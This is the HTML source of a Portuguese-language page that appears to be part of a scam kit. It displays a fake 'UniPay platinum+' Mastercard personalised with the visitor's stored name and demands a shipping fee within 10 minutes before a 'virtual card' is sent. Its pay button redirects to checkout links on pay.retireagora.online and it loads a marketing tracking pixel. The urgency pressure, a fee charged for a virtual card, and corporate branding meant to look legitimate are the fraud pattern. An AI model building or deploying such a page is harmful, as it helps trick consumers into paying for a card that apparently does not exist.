<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Uni - Faça seu Cartão</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="assets/style.css">
    
<script
  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
  async
  defer
></script>

<script>
  window.pixelId = "66bb763debbcebab27d68442";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
  document.head.appendChild(a);
</script>
    
</head><body>
    <link rel="stylesheet" href="../../../../../../../assets/style.css">
    <style>
        html, body {
            height: 100%;
            margin: 0;
            display: flex;
            flex-direction: column;
        }
        .main-content {
            flex: 1; /* Faz com que a main-content cresça para ocupar o espaço disponível */
            max-width: 400px;
            margin: 30px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.1);
        }
        .footer {
            background-color: #ffffff;
            border-top: solid 1px #e6dddd;
            color: #000;
            text-align: center;
            padding: 10px 0;
            padding-top: 10px;
            padding-bottom: 10px;
            position: relative; 
            width: 100%;
            bottom: 0;
        }
        .char {
            background-color: #e6007e;
        }


        /* .footer {
            background-color: #e6007e;
            color: white;
            padding: 10px 20px;
            text-align: center;
            border-top: 1px solid #ddd;
            width: 100%;
            position: relative;
        } */
        /* .footer {
            background-color: #ffffff;
            border-top: solid 1px #e6dddd;
            color: #000;
            text-align: center;
            padding: 10px 0;
            position: fixed;
            width: 100%;
            position: relative;
        } */
       .card-wrapper {
            max-width: 400px;
            margin: 0 auto;
            text-align: center;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            font-family: Arial, sans-serif;
        }

        .card-credit {
            background: linear-gradient(135deg, #3b3b3b, #141a1a);
            border-radius: 15px;
            padding: 20px;
            color: #fff;
            box-shadow: 0px 8px 16px #0003;
            position: relative;
            height: 200px;
            max-width: 350px;
            margin: 0 auto;
        }

        .card-details {
            position: relative;
            width: 100%;
            height: 100%;
        }

        .bank-name {
            font-size: 18px;
            font-weight: bold;
            text-align: left;
            margin-bottom: 10px;
        }

        .chip {
            position: absolute;
            top: 23px;
            left: 0px;
            width: 40px;
            display: flex;
            align-items: center;
        }

        .chip img {
            /* width: 100%;  */
            height: auto;
            width: 30px; /* Ajuste o tamanho do chip */
            margin-right: 5px; /* Espaço entre o chip e o NFC */
        }

        .nfc {
            position: absolute;
            top: 20px;
            right: 20px;
            width: 30px;
        }

        .nfc-img {
            width: 20px;
        }

        .card-number {
            font-size: 16px;
            letter-spacing: 2px;
            margin-top: 49px;
            text-align: left;
        }

        .valid-thru {
            font-size: 12px;
            text-align: left;
            margin-top: 10px;
        }

        .name-info {
            font-size: 14px;
            text-align: left;
            margin-top: 5px;
        }

        .platinum {
            position: absolute;
            top: 2px;
            right: 20px;
        }

        .mastercard {
            position: absolute;
            bottom: 20px;
            right: 20px;
            width: 50px;
        }

        .mastercard img {
            width: 100%; /* Garantir que a imagem da Mastercard ocupe todo o contêiner sem distorcer */
            height: auto;
        }

        .btn-primary {
            background-color: #e6007e;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
        }

        .btn-primary:hover {
            background-color: #c20068;
        }



    </style>

<div style="
  display: grid;
  grid-template-areas:
    'top-bar'
    'content'
    'footer';
  grid-template-rows: auto 1fr auto;
  min-height: 100vh;
">   
    <div class="header">
        <img style="width: 120px;" src="https://i.imgur.com/Q0PyyEg.png" alt="Imagem Centralizada">
    </div>

    <div style="grid-area: content; padding: 0 1rem;">
        <div style="margin-top: 18px;" class="main-content">
        <!-- <div class="card-wrapper"> -->
            <div class="card-credit">
                <div class="card-details">
                    <div class="bank-name">UniPay</div>
                    <div class="platinum">platinum+</div>
                    <div class="chip mt-3">
                        <img src="https://cdn-icons-png.flaticon.com/128/9334/9334627.png" alt="Chip do cartão" class="chip-img">
                        <img src="https://venturo-cred.org/nfc.svg" alt="NFC" class="nfc-img">
                    </div>
                    <div class="nfc">
                    </div>
                    <div class="card-number">5318 39XX XXXX XXXX</div>
                    <div class="valid-thru">VALIDADE 07/31</div>
                    <div class="name-info" style="position: relative;font-weight: bold;font-size: 16px;" id="nomeCartao">Albertino Carvalho</div> 
                    <div class="mastercard">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg" alt="Mastercard Logo">
                    </div>
                </div>
            </div>
            <div class="mt-2">
                <p class="text-start">O Cartão Virtual será enviado com as seguintes condições:</p>
                <p class="text-start"><strong>Necessário concluir o pagamento do envio em até 10 minutos.</strong></p>
                <p class="text-start">Após a aprovação, o sistema enviará automaticamente para o WhatsApp cadastrado.</p>
                <button type="button" id="botaoPagar" class="btn btn-custom rounded-pill pagando">Pagar Agora</button>
            </div>
        <!-- </div> -->
    
        </div>
    </div>    

    <script>
    document.addEventListener("DOMContentLoaded", function() {
        // Verifica se 'dadosUsuarioUni' existe no localStorage e tenta analisá-lo como JSON
        const dadosUsuarioString = localStorage.getItem('dadosUsuarioUni');
        let dadosUsuario = null;

        try {
            dadosUsuario = JSON.parse(dadosUsuarioString);
        } catch (error) {
            console.error('Erro ao analisar os dados do usuário:', error);
        }

        // Verifica se os dados existem e se estão em uma das estruturas esperadas
        if (dadosUsuario && (dadosUsuario.nome || (dadosUsuario.data && dadosUsuario.data.nome))) {
            // Verifica se o nome está diretamente em 'dadosUsuario' ou em 'dadosUsuario.data'
            const nomeCompleto = dadosUsuario.nome ? dadosUsuario.nome.split(' ') : dadosUsuario.data.nome.split(' ');
            const primeiroNome = nomeCompleto[0];
            const ultimoNome = nomeCompleto.length > 1 ? nomeCompleto[nomeCompleto.length - 1] : ''; // Verifica se existe um último nome
            const nomeParaMostrar = `${primeiroNome} ${ultimoNome}`.trim(); // Remove espaços extras se não houver último nome
            document.getElementById('nomeCartao').textContent = nomeParaMostrar;
        } else {
            console.error('Nome do usuário não encontrado no localStorage.');
        }
    });
    </script>

    <script>
        
document.getElementById('botaoPagar').addEventListener('click', function() {
    // Recupera a modalidade de envio do localStorage
    const freteEscolhido = localStorage.getItem('freteEscolhido');

    // Função para recuperar os parâmetros UTM e anexá-los à URL
    function appendUTMParamsToUrl(url) {
        const utmParams = JSON.parse(localStorage.getItem('utmParams'));
        if (utmParams) {
            const params = new URLSearchParams(utmParams);
            return url + '?' + params.toString();
        } else {
            return url; // Se não houver parâmetros UTM, retorna a URL original
        }
    }

    // Verifica qual modalidade foi escolhida e redireciona para o link correto
    if (freteEscolhido) {
        let checkoutUrl;
        if (freteEscolhido === 'sedex') {
            checkoutUrl = 'https://pay.retireagora.online/PyE2ZyL2Ex03qRb'; // Link de pagamento do SEDEX
        } else if (freteEscolhido === 'pac') {
            checkoutUrl = 'https://pay.retireagora.online/n1NLgweV9mVZMxE'; // Link de pagamento do PAC
        } else {
            alert('Erro: Modalidade de envio desconhecida.');
            return;
        }

        // Adiciona os parâmetros UTM armazenados à URL de checkout
        window.location.href = appendUTMParamsToUrl(checkoutUrl);
    } else {
        alert('Erro: Nenhuma modalidade de envio selecionada.');
    }
});

        
    </script>
    

    <div class="footer py-4" id="footerChg">
        © 2024 Uni S/A. CNPJ 68.842.676/0001-66. <br>
         Av. paulista 1320, São Paulo/SP - CEP 01310-930
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

</body>
</html>

</div>